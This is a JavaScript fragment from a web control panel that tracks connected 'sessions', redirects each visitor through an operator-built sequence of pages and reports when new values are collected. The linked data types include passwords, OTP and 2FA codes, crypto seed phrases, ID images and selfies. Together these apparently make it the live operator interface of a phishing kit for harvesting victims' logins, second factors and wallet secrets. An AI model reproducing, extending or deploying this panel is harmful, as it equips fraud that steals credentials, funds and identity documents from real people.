       const count = rowSteps.length;
       let spacing = '';
       if (count === 1) {
          spacing = 'justify-content: center';
       } else if (count === 2) {
          spacing = 'justify-content: space-evenly; padding: 0 15%';
       } else if (count === 3) {
          spacing = 'justify-content: space-evenly; padding: 0 10%';
       } else if (count <= 6) {
          spacing = 'justify-content: space-evenly';
       }
       rowEl.style = spacing;
       rowSteps.forEach(step => rowEl.appendChild(step));
       if (count > 1) {
          rowEl.setAttribute('data-needs-line', 'true');
       }
       progressSteps.appendChild(rowEl);
    });
    setTimeout(() => {
       const rows = document.querySelectorAll('.progress-row[data-needs-line]');
       rows.forEach(row => {
          drawRowLine(row);
       });
       updateProgressLines(currentIndex);
    }, 50);
 }

 function createStepElement(pageData, pageId, index, currentIndex, pageLabel) {
  const stepEl = document.createElement('div');
  stepEl.className = 'progress-step';
  stepEl.setAttribute('data-step', index + 1);
  stepEl.setAttribute('data-page', pageId);

  const circleEl = document.createElement('div');
  circleEl.className = 'step-circle';

  if (state.selectedSession?.workflow_in_progress) {
    if (index < currentIndex) {
      circleEl.classList.add('completed');
    } else if (index === currentIndex) {
      circleEl.classList.add('active');
    }
  }

  const numberEl = document.createElement('span');
  numberEl.className = 'step-number';
  numberEl.textContent = index + 1;

  const checkEl = document.createElement('span');
  checkEl.className = 'checkmark';
  checkEl.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';

  circleEl.appendChild(numberEl);
  circleEl.appendChild(checkEl);

  const labelEl = document.createElement('div');
  labelEl.className = 'step-label';
  labelEl.textContent = pageLabel;

  stepEl.appendChild(circleEl);
  stepEl.appendChild(labelEl);

  if (pageData && pageData.required_data && pageData.required_data.length > 0) {
    const inputContainer = document.createElement('div');
    inputContainer.className = 'step-input-container';

    let debounceTimeout;

    pageData.required_data.forEach((field, i) => {
       let fieldDebounceTimeout;

       const label = document.createElement('label');
       label.className = 'step-input-label';
       label.textContent = field.value || `Field ${i + 1}`;

       const input = document.createElement('input');
       input.type = field.type || 'text';
       input.placeholder = field.placeholder || '';
       input.className = 'step-input';
       const cleanPageId = pageData.id.replace(/^\/+/, '');
       input.setAttribute('data-page', cleanPageId);
       input.setAttribute('data-field', field.value || `field_${i}`);
       const placeholderVar = field.placeholder_name || field.value || `placeholder_${i}`;
       input.setAttribute('data-placeholder-name', placeholderVar);

       if (state.workflowInputValues && state.workflowInputValues[pageData.id]) {
          if (state.workflowInputValues[pageData.id][placeholderVar] !== undefined) {
             input.value = state.workflowInputValues[pageData.id][placeholderVar];
          }
       }

       const connections = (typeof iconConnectionSystem !== 'undefined' && iconConnectionSystem.getConnections) ?
                           iconConnectionSystem.getConnections() : [];
       const isDatalinked = connections.some(conn =>
           (conn.targetPageId === cleanPageId || conn.targetPageId === pageData.id) &&
           (conn.dataType === field.type || (conn.to_value && conn.to_value === (field.placeholder_name || field.value)))
       );

       if (isDatalinked) {
           input.disabled = true;
           const sourcePageId = connections.find(conn => (conn.targetPageId === cleanPageId || conn.targetPageId === pageData.id) && (conn.dataType === field.type || (conn.to_value && conn.to_value === (field.placeholder_name || field.value))))?.sourcePageId || 'Source';
           input.placeholder = `${sourcePageId} datalinked`;
           input.classList.add('receiving-data');
           label.classList.add('receiving-data-label');
       } else {
           input.addEventListener('input', function() {
              state.workflowInputValues = state.workflowInputValues || {};
              state.workflowInputValues[pageData.id] = state.workflowInputValues[pageData.id] || {};
              const currentPlaceholderName = this.getAttribute('data-placeholder-name');
              state.workflowInputValues[pageData.id][currentPlaceholderName] = this.value;
              if (fieldDebounceTimeout) clearTimeout(fieldDebounceTimeout);
              fieldDebounceTimeout = setTimeout(() => {
                  const finalValue = this.value; 
                  const pageIdForUpdate = this.getAttribute('data-page');

                  if (currentPlaceholderName && pageIdForUpdate && state.selectedSession) {
                     updatePlaceholder(currentPlaceholderName, finalValue, pageIdForUpdate);
                  } else {
                  }
              }, 500); 
           });
       }

       inputContainer.appendChild(label);
       inputContainer.appendChild(input);
    });
    stepEl.appendChild(inputContainer);
  }

  return stepEl;
}

 function drawRowLine(rowEl) {
    const steps = rowEl.querySelectorAll('.progress-step');
    if (steps.length <= 1) return;
    const firstCircle = steps[0].querySelector('.step-circle');
    const lastCircle = steps[steps.length - 1].querySelector('.step-circle');
    const rowRect = rowEl.getBoundingClientRect();
    const firstRect = firstCircle.getBoundingClientRect();
    const lastRect = lastCircle.getBoundingClientRect();
    const startX = firstRect.left - rowRect.left + firstRect.width / 2;
    const endX = lastRect.left - rowRect.left + lastRect.width / 2;
    const width = endX - startX;
    const bgLine = document.createElement('div');
    bgLine.className = 'progress-line';
    bgLine.style.left = `${startX}px`;
    bgLine.style.width = `${width}px`;
    const activeLine = document.createElement('div');
    activeLine.className = 'progress-line-active';
    activeLine.style.left = `${startX}px`;
    activeLine.style.width = '0';
    activeLine.setAttribute('data-row', rowEl.getAttribute('data-row'));
    activeLine.setAttribute('data-full-width', width);
    rowEl.appendChild(bgLine);
    rowEl.appendChild(activeLine);
 }

 function updateProgressLines(currentIndex, isCompleted) {
    const rows = document.querySelectorAll('.progress-row');
    const allSteps = document.querySelectorAll('.progress-step');
    rows.forEach(row => {
       const rowSteps = Array.from(row.querySelectorAll('.progress-step'));
       const activeLine = row.querySelector('.progress-line-active');
       if (!activeLine || rowSteps.length <= 1) return;
       const fullWidth = parseFloat(activeLine.getAttribute('data-full-width'));
       let progress = 0;
       if (isCompleted === true) {
          progress = 1;
       } else {
          const firstStepInRow = rowSteps[0];
          const lastStepInRow = rowSteps[rowSteps.length - 1];
          const firstStepIndex = Array.from(allSteps).indexOf(firstStepInRow);
          const lastStepIndex = Array.from(allSteps).indexOf(lastStepInRow);
          if (currentIndex <= firstStepIndex) {
             progress = 0;
          } else if (currentIndex > lastStepIndex) {
             progress = 1;
          } else {
             const stepsInRow = lastStepIndex - firstStepIndex + 1;
             const stepsCompleted = currentIndex - firstStepIndex;
             progress = stepsCompleted / stepsInRow;
          }
       }
       activeLine.style.width = `${fullWidth * progress}px`;
    });
 }

 function isWorkflowComplete() {
  if (!state.selectedSession || !state.selectedSession.workflow) return false;
  
  if (state.selectedSession.workflow_completed === true) {
    const currentWorkflowLength = state.workflow ? state.workflow.length : 0;
    const sessionWorkflowLength = state.selectedSession.workflow.length;
    
    if (currentWorkflowLength !== sessionWorkflowLength) {
      return false; 
    }
    return true;
  }
  
  const workflow = state.selectedSession.workflow;
  const currentIndex = state.selectedSession.current_page_index || 0;
  if (workflow.length === 0) return false;
  return currentIndex >= workflow.length;
}

 function updateWorkflowCardProgress(allCompleted) {
    if (!state.selectedSession) return;
    const workflowCards = document.querySelectorAll('#workflowMainList .workflow-card, #workflowMainList .card-preview');
    if (allCompleted || state.selectedSession.workflow_in_progress === 0) {
       workflowCards.forEach(card => {
          card.classList.add('completed');
       });
       return;
    }
    const currentIndex = state.selectedSession.current_page_index || 0;
    workflowCards.forEach((card, index) => {
       card.classList.remove('completed');
       if (index < workflowCards.length - 1) {
          card.classList.add('has-line');
       } else {
          card.classList.remove('has-line');
       }
       if (index < currentIndex) {
          card.classList.add('completed');
       }
    });
 }

 function animateStepTransition(fromIndex, toIndex) {
    if (fromIndex === toIndex) return;
    const steps = document.querySelectorAll('.progress-step');
    if (!steps.length) return;
    const validToIndex = Math.min(toIndex, steps.length - 1);
    steps.forEach((step, index) => {
       const circle = step.querySelector('.step-circle');
       const label = step.querySelector('.step-label');
       step.style.visibility = 'visible';
       circle.style.visibility = 'visible';
       if (label) label.style.visibility = 'visible';
       circle.classList.remove('active');
       if (index < validToIndex) {
          circle.classList.add('completed');
       } else if (index === validToIndex) {
          circle.classList.add('active');
       } else {
          circle.classList.remove('completed');
       }
    });
    const rows = document.querySelectorAll('.progress-row');
    rows.forEach(row => {
       const rowSteps = Array.from(row.querySelectorAll('.progress-step'));
       const activeLine = row.querySelector('.progress-line-active');
       if (!activeLine || rowSteps.length <= 1) return;
       const fullWidth = parseFloat(activeLine.getAttribute('data-full-width') || '0');
       const firstStepInRow = rowSteps[0];
       const lastStepInRow = rowSteps[rowSteps.length - 1];
       const firstStepIndex = Array.from(steps).indexOf(firstStepInRow);
       const lastStepIndex = Array.from(steps).indexOf(lastStepInRow);
       activeLine.style.visibility = 'visible';
       let progress = 0;
       if (validToIndex <= firstStepIndex) {
          progress = 0;
       } else if (validToIndex > lastStepIndex) {
          progress = 1;
       } else if (validToIndex > firstStepIndex) {
          const stepsInRow = lastStepIndex - firstStepIndex;
          if (stepsInRow > 0) {
             const stepsCompleted = validToIndex - firstStepIndex;
             progress = Math.min(1, stepsCompleted / stepsInRow);
          } else {
             progress = 1;
          }
       }
       activeLine.style.width = `${fullWidth * progress}px`;
    });
    const activeStep = steps[validToIndex]?.querySelector('.step-circle');
    if (activeStep) {
       activeStep.style.transform = 'scale(1.2)';
       setTimeout(() => {
          activeStep.style.transform = '';
       }, 400);
    }
 }

 function updateProgressStepHighlights(currentIndex, workflowInProgress) {
    const steps = document.querySelectorAll('.progress-step');
    if (!steps.length) return;
    if (workflowInProgress === 0) {
       steps.forEach(step => {
          const circle = step.querySelector('.step-circle');
          if (circle) {
             circle.classList.remove('active');
             circle.classList.add('completed');
          }
       });
       updateProgressLines(steps.length, true);
       return;
    }
    steps.forEach(step => {
       const circle = step.querySelector('.step-circle');
       if (circle) {
          circle.classList.remove('active', 'completed');
       }
    });
    steps.forEach((step, index) => {
       const circle = step.querySelector('.step-circle');
       if (circle) {
          if (index < currentIndex) {
             circle.classList.add('completed');
          } else if (index === currentIndex) {
             circle.classList.add('active');
          }
       }
    });
    updateProgressLines(currentIndex, false);
 }

 function startProgressPolling() {
    if (progressUpdateInterval) {
       clearInterval(progressUpdateInterval);
    }
    progressUpdateInterval = setInterval(() => {
       if (state.selectedSession && state.selectedSession.id) {
          socket.emit('get_session', {
             session_id: state.selectedSession.id
          });
          updateProgressBasedOnWorkflowStatus(state.selectedSession);
       } else {
          clearInterval(progressUpdateInterval);
          progressUpdateInterval = null;
       }
    }, 3000);
 }

 function updateProgressBasedOnWorkflowStatus(session) {
    if (!session) return;
    const {
       workflow,
       current_page_index,
       workflow_in_progress
    } = session;
    if (!workflow || !Array.isArray(workflow) || workflow.length === 0) return;
    if (workflow_in_progress === 0) {
       const progressBar = document.getElementById('workflowProgress');
       const statusBadge = document.getElementById('workflowStatusBadge');
       if (progressBar) progressBar.style.width = '100%';
       if (statusBadge) {
          statusBadge.classList.remove('status-progress');
          statusBadge.classList.add('status-completed');
          statusBadge.innerText = 'Completed';
       }
       updateProgressStepHighlights(workflow.length, 0);
       updateWorkflowCardProgress(true);
       return;
    }
    const currentIdx = typeof current_page_index === 'number' ? current_page_index : 0;
    let progressPercent;
    if (currentIdx >= workflow.length - 1) {
       progressPercent = 99;
    } else {
       progressPercent = Math.min(95, ((currentIdx + 1) / workflow.length) * 100);
    }
    const progressBar = document.getElementById('workflowProgress');
    const statusBadge = document.getElementById('workflowStatusBadge');
    if (progressBar) progressBar.style.width = progressPercent + '%';
    if (statusBadge) {
       statusBadge.classList.remove('status-completed');
       statusBadge.classList.add('status-progress');
       statusBadge.innerText = 'In Progress';
    }
    updateProgressStepHighlights(currentIdx, workflow_in_progress);
    updateWorkflowCardProgress(false);
 }


 function executeWorkflowAction() {
  const executeBtn = document.getElementById('executeWorkflow');
  if (executeBtn.classList.contains('btn-disabled')) {
    return;
  }
  
  if (isWorkflowComplete()) {
    showToast('Workflow is already completed. Create a new workflow or reset this one.', 'info');
    return;
  }
  
  const workflowMainList = document.querySelectorAll('#workflowMainList .workflow-card, .card-preview');
  if (workflowMainList.length === 0) {
    showToast('No workflow steps defined', 'error');
    return;
  }
  
  const invalidPages = [];
  
  workflowMainList.forEach(card => {
    const pageId = card.getAttribute('data-id');
    const cleanPageId = pageId.replace(/^\/+/, '');
    
    const pageData = state.availablePages.find(p => p.id === pageId || p.id === cleanPageId);
    
    if (pageData && pageData.required_data && pageData.required_data.length > 0) {
      let pageIsValid = true;
      
      pageData.required_data.forEach(field => {
        const fieldName = field.placeholder_name || field.value;
        
        const fieldSelector = `.step-input[data-page="${cleanPageId}"][data-field="${fieldName}"], .step-input[data-page="${pageId}"][data-field="${fieldName}"]`;
        const inputElement = document.querySelector(fieldSelector);
        
        const isDatalinked = inputElement && (
          inputElement.classList.contains('receiving-data') || 
          inputElement.placeholder.includes('datalinked')
        );
        
        const hasInputValue = inputElement && inputElement.value && inputElement.value.trim() !== '';
        
        if (!isDatalinked && !hasInputValue) {
          pageIsValid = false;
        }
      });
      
      if (!pageIsValid) {
        invalidPages.push(pageData.label || cleanPageId);
      }
    }
  });
  
  if (invalidPages.length > 0) {
    showToast(`Cannot start workflow: Missing input data for: ${invalidPages.join(', ')}`, 'error');
    return;
  }
  
  const workflowPages = [];
  const placeholderValues = {};
  state.workflowInputValues = state.workflowInputValues || {};
  document.querySelectorAll('.progress-step .step-input').forEach(input => {
    const value = input.value.trim();
    if (value) {
      const pageName = input.getAttribute('data-page');
      const placeholderName = input.getAttribute('data-placeholder-name');
      updatePlaceholder(placeholderName, value, pageName);
      const cleanPageId = pageName.replace(/^\/+/, '');
      if (!placeholderValues[cleanPageId]) {
        placeholderValues[cleanPageId] = {};
      }
      placeholderValues[cleanPageId][placeholderName] = value;
    }
  });
  
  workflowMainList.forEach(function(card) {
    const pageId = card.getAttribute('data-id');
    workflowPages.push(pageId);
    if (state.workflowInputValues[pageId]) {
      const cleanPageId = pageId.replace(/^\/+/, '');
      if (!placeholderValues[cleanPageId]) {
        placeholderValues[cleanPageId] = {};
      }
      Object.assign(placeholderValues[cleanPageId], state.workflowInputValues[pageId]);
    }
  });
  
  const originalText = executeBtn.innerHTML;
  executeBtn.innerHTML = '<div class="loading-spinner"></div> Starting...';
  executeBtn.disabled = true;
  startProgressPolling();
  const hideRouteToggle = document.getElementById('hide_routeToggle');
  
  setTimeout(() => {
    socket.emit('start_workflow', {
      session_id: state.selectedSession.id,
      workflow_pages: workflowPages,
      placeholder_values: placeholderValues,
      toggle_status: hideRouteToggle ? hideRouteToggle.checked : false
    });
    setTimeout(() => {
      executeBtn.innerHTML = originalText;
      executeBtn.disabled = false;
    }, 1500);
  }, 100);
}

 document.getElementById('workflowPresetSelect').addEventListener('change', async function() {
    const sel = document.getElementById('workflowPresetSelect');
    if (sel.value === 'create') {
       const name = await showInputBoxModal('Enter a name for your preset', 'Preset name', 'Save');
       if (name) {
          workflowPresets.push(name);
          localStorage.setItem(WF_STORE.listKey, JSON.stringify(workflowPresets));
          renderWorkflowPresets();
          sel.value = name;
       } else {
          sel.value = workflowPresets.length ? workflowPresets[0] : 'create';
       }
    }
 });
 document.getElementById('loadWorkflowPreset').addEventListener('click', async () => {
  const presetSelect = document.getElementById('workflowPresetSelect');
  const selectedPresetName = presetSelect.value;

  if (!selectedPresetName || selectedPresetName === 'create') {
    showToast('Please select a valid preset to load.', 'warning');
    return;
  }
  try {
    const storedData = localStorage.getItem(WF_STORE.dataKey(selectedPresetName));
    if (storedData) {
      const loadedData = JSON.parse(storedData);
      
      if (loadedData.pages && Array.isArray(loadedData.pages)) {
        state.workflow = loadedData.pages;
        
        await renderWorkflow(); 
        
        if (loadedData.connections && Array.isArray(loadedData.connections)) {
          
          iconConnectionSystem.clearAllConnections();
          
          let attempts = 0;
          const maxAttempts = 2;
          const attemptDelay = 5000;
          
          function attemptRestore() {
            
            iconConnectionSystem.scanForIcons();
            iconConnectionSystem.restoreConnections(loadedData.connections);
            
            const restoredConnections = iconConnectionSystem.getConnections();
            
            if (attempts < maxAttempts) {
              attempts++;
              setTimeout(attemptRestore, attemptDelay);
            } else {
              updateInputsBasedOnConnections();
              renderWorkflowProgress();
            }
          }
          
          setTimeout(attemptRestore, 150);
        } else {
          setTimeout(() => {
            updateInputsBasedOnConnections();
            renderWorkflowProgress();
          }, 100);
        }
        
        showToast(`Loaded workflow preset: ${selectedPresetName}`, 'success');
      } else if (Array.isArray(loadedData)) {
        state.workflow = loadedData; 
        
        await renderWorkflow(); 
        
        let attempts = 0;
        const maxAttempts = 2;
        const attemptDelay = 5000;
        
        function attemptRestore() {
          
          iconConnectionSystem.scanForIcons();
          iconConnectionSystem.restoreConnections(); 
          
          const connectionsAfter = iconConnectionSystem.getConnections();
          
          if (attempts < maxAttempts) {
            attempts++;
            setTimeout(attemptRestore, attemptDelay);
          } else {
            updateInputsBasedOnConnections();
            renderWorkflowProgress();
          }
        }
        
        setTimeout(attemptRestore, 150);
        
        showToast(`Loaded workflow preset: ${selectedPresetName}`, 'success');
      } else {
        logErrorToServer({
          message: `Invalid workflow data format for preset "${selectedPresetName}"`,
          data: loadedData
        });
      }
    } else {
      showToast(`Could not find saved data for preset "${selectedPresetName}"`, 'warning');
    }
  } catch (error) {
    logErrorToServer({
      message: `Error loading/parsing workflow preset "${selectedPresetName}"`,
      error: error,
      stack: error.stack ? error.stack : 'No stack trace available'
    });
    showToast(`Error loading preset "${selectedPresetName}"`, 'error');
  }
});

document.getElementById('saveWorkflowPreset').addEventListener('click', async function() {
  const name = await showInputBoxModal('Enter a name for your preset', 'Preset name', 'Save');
  if (!name) return;
  if (!workflowPresets.includes(name)) {
     workflowPresets.push(name);
     localStorage.setItem(WF_STORE.listKey, JSON.stringify(workflowPresets));
     renderWorkflowPresets();
  }
  const workflowData = {
      pages: state.workflow,
      connections: iconConnectionSystem.getConnections ? iconConnectionSystem.getConnections() : []
  };
  localStorage.setItem(WF_STORE.dataKey(name), JSON.stringify(workflowData));
  showToast(`Saved workflow as ${name}`, 'success');
});
 document.getElementById('delWorkflowPreset').addEventListener('click', function() {
    const sel = document.getElementById('workflowPresetSelect');
    const name = sel.value;
    if (name === 'create') return;
    workflowPresets = workflowPresets.filter(n => n !== name);
    localStorage.setItem(WF_STORE.listKey, JSON.stringify(workflowPresets));
    localStorage.removeItem(WF_STORE.dataKey(name));
    renderWorkflowPresets();
    sel.value = workflowPresets.length ? workflowPresets[0] : 'create';
    showToast(`Deleted workflow preset ${name}`, 'success');
 });

 function renderWorkflowPresets() {
    const sel = document.getElementById('workflowPresetSelect');
    sel.innerHTML = '';
    workflowPresets.forEach(name => {
       const opt = document.createElement('option');
       opt.value = name;
       opt.textContent = name;
       sel.append(opt);
    });
    const create = document.createElement('option');
    create.value = 'create';
    create.textContent = '+ New Preset';
    sel.append(create);
 }
 socket.on('change_page', function(data) {
    if (data.workflow_data) {
       const onAdminPage = window.location.pathname.includes('/admin/') || window.location.pathname.includes('/dashboard/');
       if (state.selectedSession && state.selectedSession.id === data.session_id) {
          const previousIndex = state.selectedSession.current_page_index || 0;
          state.selectedSession.workflow = data.workflow_data.pages;
          state.selectedSession.current_page_index = data.workflow_data.current_index;
          renderWorkflowProgress();
          updateWorkflowCardProgress();
          setTimeout(() => {
             animateStepTransition(previousIndex, data.workflow_data.current_index);
          }, 50);
       }
       if (!onAdminPage) {
          const currentPath = window.location.pathname;
          const targetPage = data.page;
          if (currentPath !== targetPage) {
             window.location.href = targetPage;
          }
       }
    }
 });
 socket.on('workflow_started', function(data) {
    if (state.selectedSession && state.selectedSession.id === data.session_id) {
       if (data.workflow_data) {
          const previousIndex = state.selectedSession.current_page_index || 0;
          state.selectedSession.workflow = data.workflow_data.pages;
          state.selectedSession.current_page_index = data.workflow_data.current_index;
          if (previousIndex !== data.workflow_data.current_index) {
             setTimeout(() => {
                animateStepTransition(previousIndex, data.workflow_data.current_index);
             }, 50);
          }
          renderWorkflowProgress();
          updateWorkflowCardProgress();
          showToast('Workflow started for session', 'success');
          startProgressPolling();
       }
    }
 });
 socket.on('session_updated', function(data) {
    const sessionIndex = state.sessions.findIndex(s => s.id === data.id);
    if (sessionIndex !== -1) {
       Object.keys(data).forEach(key => {
          state.sessions[sessionIndex][key] = data[key];
       });
       if (data.lastPingTimestamp) {
          state.sessions[sessionIndex].lastPingTimestamp = new Date();
       }
       if (data.hasOwnProperty('isActive')) {
          state.sessions[sessionIndex].isActive = data.isActive;
       }
       if (data.current_page) {
          state.sessions[sessionIndex].current_page = data.current_page;
       }
       if (data.hasOwnProperty('current_page_index')) {
          state.sessions[sessionIndex].current_page_index = data.current_page_index;
       }
       if (data.placeholders) {
          state.sessions[sessionIndex].placeholders = data.placeholders;
       }
       if (data.values) {
          state.sessions[sessionIndex].values = data.values;
       }
       if (data.socket_id) {
          state.sessions[sessionIndex].socket_id = data.socket_id;
       }
       if (data.activity_log) {
          state.sessions[sessionIndex].activity_log = data.activity_log;
       }
       if (data.hasOwnProperty('workflow_in_progress')) {
          state.sessions[sessionIndex].workflow_in_progress = data.workflow_in_progress;
       }
       if (data.hasOwnProperty('workflow')) {
          state.sessions[sessionIndex].workflow = data.workflow;
       }
       if (state.selectedSession.activity_log) {
        updateActivityLog();
      }
    } else {
       const newSession = newSession(data);
       state.sessions.push(newSession);
    }
    if (state.selectedSession && data.id === state.selectedSession.id) {
       state.selectedSession = state.sessions.find(s => s.id === data.id);
       updateConnectionDetails();
       updateSessionManager();
       updateSessionValues();
       renderSessionInputData(data.id).then(() => {
        updateSessionInputFields(state.selectedSession);
    });
       if (state.selectedSession.activity_log) {
          updateActivityLog();
       }
       updateProgressBasedOnWorkflowStatus(state.selectedSession);
       if (state.selectedSession.workflow_in_progress && !progressUpdateInterval) {
          startProgressPolling();
       }
       if (data.current_page && data.current_page !== state.previousPage) {
          showToast(`User navigated to: ${data.current_page}`, 'info');
          state.previousPage = data.current_page;
       }
       if (data.values && Object.keys(data.values).length > (state.previousValuesCount || 0)) {
          showToast('New values collected', 'success');
          state.previousValuesCount = Object.keys(data.values).length;
       }
    }
    updateSessionList();
    if (data.workflow_completed) {
       showToast(`Workflow completed for session ${data.id}`, 'success');
       if (state.settings.playSound) {
          playNotificationSound('workflow-complete');
       }
    }
    if (data.hasOwnProperty('isActive') && !data.isActive) {
       if (state.settings.showDisconnectNotifications) {
          showToast(`Session ${data.id} disconnected`, 'warning');
       }
    }
 });
 const originalSelectSession = selectSession;
 selectSession = function(sessionId) {
    originalSelectSession(sessionId);
    if (state.selectedSession) {
       socket.emit('get_session', {
          session_id: sessionId
       });
       renderWorkflowProgress();
       updateProgressBasedOnWorkflowStatus(state.selectedSession);
       if (state.selectedSession.workflow_in_progress) {
          startProgressPolling();
       }
    }
 };
 socket.on('connect', function() {
    if (state.selectedSession && state.selectedSession.id) {
       socket.emit('get_session', {
          session_id: state.selectedSession.id
       });
    }
 });
 new Sortable(document.getElementById('workflowAvailableList'), {
  group: {
    name: 'workflow',
    pull: 'clone',
    put: false
  },
  sort: false,
  animation: 150,
  swapThreshold: 1,
  filter: '.workflow-icon, .workflow-remove, .workflow-controls',
  preventOnFilter: true,
  onAdd(evt) {
     const id = evt.item.dataset.id;
     state.workflow = state.workflow.filter(w => w !== id);
     renderWorkflow();
     
     let attempts = 0;
     const maxAttempts = 2;
     const attemptDelay = 5000;
     
     function attemptRestore() {
       iconConnectionSystem.scanForIcons();
       iconConnectionSystem.restoreConnections();
       
       if (attempts < maxAttempts) {
         attempts++;
         setTimeout(attemptRestore, attemptDelay);
       }
     }
     
     setTimeout(attemptRestore, 150);
  }
});
new Sortable(document.getElementById('workflowPagesDisplay'), {
  group: 'workflow',
  animation: 150,
  swapThreshold: 1,
  filter: '.workflow-icon, .workflow-remove, .workflow-controls',
  preventOnFilter: true,
  async onAdd(evt) {
      const pageId = evt.item.dataset.id;
      try {
          const response = await fetch('/api/v1/config');
          if (!response.ok) throw new Error('Failed to fetch config');
          const config = await response.json();
          
          const currentPages = config.options?.workflow_pages || [];
          if (currentPages.includes(pageId)) return;
          
          const newWorkflowPages = [...currentPages];
          newWorkflowPages.splice(evt.newIndex, 0, pageId);
          
          socket.emit('save_settings', { workflow_pages: newWorkflowPages });
          renderWorkflowInfo();
      iconConnectionSystem.scanForIcons();
      } catch (err) {
          renderWorkflowInfo();
      }
  },
  async onUpdate(evt) {
      try {
          const response = await fetch('/api/v1/config');
          if (!response.ok) throw new Error('Failed to fetch config');
          const config = await response.json();
          
          const currentPages = [...config.options.workflow_pages];
          const [moved] = currentPages.splice(evt.oldIndex, 1);
          currentPages.splice(evt.newIndex, 0, moved);
          
          socket.emit('save_settings', { workflow_pages: currentPages });
          renderWorkflowInfo();
          iconConnectionSystem.scanForIcons();
      } catch (err) {
          renderWorkflowInfo();
      }
  }
});

new Sortable(document.getElementById('workflowAvailablePages'), {
  group: {
      name: 'workflow',
      pull: 'clone',
      put: false
  },
  sort: false,
  animation: 150,
  filter: '.workflow-icon, .workflow-remove, .workflow-controls',
  preventOnFilter: true
});
new Sortable(document.getElementById('workflowMainList'), {
  group: 'workflow',
  animation: 150,
  swapThreshold: 1,
  filter: '.workflow-icon, .workflow-remove, .workflow-controls',
  preventOnFilter: true,
  onAdd(evt) {
    const id = evt.item.dataset.id;
    
    if (state.selectedSession) {
      if (state.selectedSession.workflow_completed === true || state.selectedSession.workflow_in_progress === 0) {
        state.selectedSession.workflow_in_progress = 1;
        state.selectedSession.workflow_completed = false;
        
        if (typeof state.selectedSession.current_page_index !== 'undefined') {
          state.selectedSession.current_page_index = Math.min(evt.newIndex, state.workflow.length);
        }
      }
    }
    state.workflow.splice(evt.newIndex, 0, id);
    renderWorkflow();
    if (state.selectedSession) {
      updateProgressBasedOnWorkflowStatus(state.selectedSession);
    }
    
    let attempts = 0;
    const maxAttempts = 2;
    const attemptDelay = 5000;
    
    function attemptRestore() {
      iconConnectionSystem.scanForIcons();
      iconConnectionSystem.restoreConnections();
      
      if (attempts < maxAttempts) {
        attempts++;
        setTimeout(attemptRestore, attemptDelay);
      }
    }
    
    setTimeout(attemptRestore, 150);
  },
  onUpdate(evt) {
    const id = evt.item.dataset.id;
    const [moved] = state.workflow.splice(evt.oldIndex, 1);
    state.workflow.splice(evt.newIndex, 0, moved);
    renderWorkflow();
    let attempts = 0;
    const maxAttempts = 2; 
    const attemptDelay = 5000;
    
    function attemptRestore() {
      iconConnectionSystem.restoreConnections();
      
      if (attempts < maxAttempts) {
        attempts++;
        setTimeout(attemptRestore, attemptDelay);
      }
    }
    
    setTimeout(attemptRestore, 150);
  }
});
 const iconConnectionSystem = (() => {
    let activeConnection = null;
    let connectionLine = null;
    let connections = [];

    function init() {
      const style = document.createElement('style');
      style.textContent = `
      :root {
        --workflow-provider-shadow: rgba(76, 175, 80, 0.7); /* Greenish for providers */
        --workflow-consumer-shadow: rgba(33, 150, 243, 0.7); /* Bluish for consumers */
      }

      /* Icon wrapper with background */
      .icon-wrapper {
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
        width: 24px;
        height: 24px;
        border-radius: 6px;
        z-index: 25;
        box-shadow: none; /* Default: no shadow */
        transition: box-shadow 0.2s ease-in-out; /* Add smooth transition */
      }
      .icon-wrapper.icon-provider {
        box-shadow: 0 0 0 2px var(--workflow-provider-shadow);
      }
      .icon-wrapper.icon-consumer {
        box-shadow: 0 0 0 2px var(--workflow-consumer-shadow);
      }
      /* Data type specific backgrounds */
      .icon-type-email { background-color: var(--icon-bg-email); }
      .icon-type-password { background-color: var(--icon-bg-password); }
      .icon-type-currentpassword { background-color: var(--icon-bg-currentpassword); }
      .icon-type-newpassword { background-color: var(--icon-bg-newpassword); }
      .icon-type-phone { background-color: var(--icon-bg-phone); }
      .icon-type-otpcode { background-color: var(--icon-bg-otpcode); }
      .icon-type-identifier { background-color: var(--icon-bg-identifier); }
      .icon-type-username { background-color: var(--icon-bg-username); }
      .icon-type-recovery { background-color: var(--icon-bg-recovery); }
      .icon-type-seedphrase { background-color: var(--icon-bg-seedphrase); }
      .icon-type-seedbackup { background-color: var(--icon-bg-seedbackup); }
      .icon-type-seedimport { background-color: var(--icon-bg-seedimport); }
      .icon-type-seed { background-color: var(--icon-bg-seed); }
      .icon-type-idfront { background-color: var(--icon-bg-idfront); }
      .icon-type-idback { background-color: var(--icon-bg-idback); }
      .icon-type-selfie { background-color: var(--icon-bg-selfie); }
      .icon-type-image { background-color: var(--icon-bg-image); }
      .icon-type-activityform { background-color: var(--icon-bg-activityform); }
      .icon-type-holdingsform { background-color: var(--icon-bg-holdingsform); }
      .icon-type-activity { background-color: var(--icon-bg-activity); }
      .icon-type-code { background-color: var(--icon-bg-code); }
      .icon-type-verifytext { background-color: var(--icon-bg-verifytext); }
      .icon-type-countrycode { background-color: var(--icon-bg-countrycode); }
      .icon-type-default { background-color: var(--icon-bg-default); }
      
      /* Original icon styles */
      .workflow-icon { position: relative; z-index: 25; }
      .workflowIcon-draggable { cursor: grab !important; }
      #draggableIconLine { position: fixed; height: 3px; pointer-events: none; z-index: 9999; transform-origin: left center; }
      .icon-connection { position: absolute; height: 2px; background-color: currentColor; pointer-events: none; z-index: 100; transform-origin: left center; }
      #connectionContainer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 20; }
      
      /* Icon Foreground Colors - Light Mode */
      .workflow-icon[data-icon-type="email"], .connection-email { color: var(--color-email-light); }
      .workflow-icon[data-icon-type="password"], .connection-password { color: var(--color-password-light); }
      .workflow-icon[data-icon-type="current-password"], .connection-current-password { color: var(--color-currentpassword-light); }
      .workflow-icon[data-icon-type="new-password"], .connection-new-password { color: var(--color-newpassword-light); }
      .workflow-icon[data-icon-type="phone"], .workflow-icon[data-icon-type="phonenumb"], .connection-phone, .connection-phonenumb { color: var(--color-phone-light); }
      .workflow-icon[data-icon-type="2facode"], .workflow-icon[data-icon-type="otpcode"], .workflow-icon[data-icon-type="securitycode"], .connection-2facode, .connection-otpcode, .connection-securitycode { color: var(--color-otpcode-light); }
